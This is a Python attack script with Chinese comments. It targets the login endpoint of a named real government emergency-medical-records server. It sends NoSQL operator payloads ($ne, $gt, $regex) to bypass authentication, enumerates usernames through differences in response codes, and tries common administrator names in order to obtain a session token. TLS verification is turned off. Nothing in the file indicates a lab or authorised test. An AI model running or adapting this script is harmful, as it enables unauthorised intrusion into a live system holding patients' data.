#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NoSQL 数据提取 / token 获取尝试
已知: username:{$ne:null} -> 403 (多用户); 其他算子/单匹配 -> 500 TypeError
策略:
 A) 用 $gt/$lt 在 username 上做范围, 配合 $ne 找出"恰好多匹配"的边界 -> 枚举用户名
 B) 尝试各种能让查询恰好返回 1 个用户 且 不触发 TypeError 的组合, 争取 200/token
 C) 测试 password 字段用 $ne 而 username 用精确值(或反之)的混合, 定位 TypeError 来源
"""
import json, ssl, urllib.request, urllib.error, time, string

BASE="https://epcr.tpf.gov.tw:4004/login"
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
def post(body):
    data=json.dumps(body).encode()
    req=urllib.request.Request(BASE,data=data,method="POST",
        headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    try:
        r=urllib.request.urlopen(req,timeout=12,context=CTX)
        return r.getcode(), r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")
    except Exception as e:
        return None, repr(e)

def tag(code,b):
    if code==200: return "TOKEN"
    if code==403: return "403"
    if code==500: return "500"
    if code==401: return "401"
    return f"?" if code is None else str(code)

# --- A) 混合: 哪个字段用 $ne 触发 403? ---
print("=== 混合字段测试 ===")
mix=[
 ("user=$ne,pass=str",    {"username":{"$ne":None},"password":"x","captcha":"1","domain":"AUTH_SERVER"}),
 ("user=str,pass=$ne",    {"username":"x","password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
 ("user=$ne,pass=$ne",    {"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
 ("user=$ne,pass=$gt''",  {"username":{"$ne":None},"password":{"$gt":""},"captcha":"1","domain":"AUTH_SERVER"}),
 ("user=$gt'',pass=$ne",  {"username":{"$gt":""},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
]
for n,b in mix:
    c,body=post(b); print(f"  [{n:22s}] -> {c} {tag(c,body)} | {body[:60]}"); time.sleep(0.15)

# --- B) $gt 范围: 找 username 排序边界 (假设 username 是字符串) ---
# 若 $gt:X 匹配 >=2 用户 -> 403; 0/1 -> 500. 用二分逼近最小用户名
print("\n=== $gt 范围探测 (403=有>1用户大于X, 500=0/1) ===")
# 测试几个字母作为下界
for lo in ["!","A","a","B","b","C","c","D","d","m","M","Z","z","{"]:
    b={"username":{"$gt":lo},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    c,body=post(b); print(f"  username > {lo!r}  -> {c} {tag(c,body)}"); time.sleep(0.15)

# --- C) 尝试拿到 token: 让 username 精确匹配一个真实用户 ---
# 先探测常见管理员用户名是否"存在"(用 $ne 单字符前缀+长度)
print("\n=== 常见用户名存在性探测 (username=$regex:^name$, pass=$ne) ===")
names=["admin","administrator","root","user","test","epcr","dispatch","operator","manager","superuser","admin123","tpf","account","staff","driver","ambulance","rescue","medic","999","001","123"]
for nm in names:
    b={"username":{"$regex":f"^{nm}$"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    c,body=post(b)
    # 单用户/零用户都 500; 但我们要的是能拿到 token 的. 这里主要看是否有 200/403 差异
    mark=""
    if c==200: mark="  <=== TOKEN!"
    print(f"  username=={nm!r} -> {c} {tag(c,body)} | {body[:50]}{mark}"); time.sleep(0.15)

print("\nDONE")
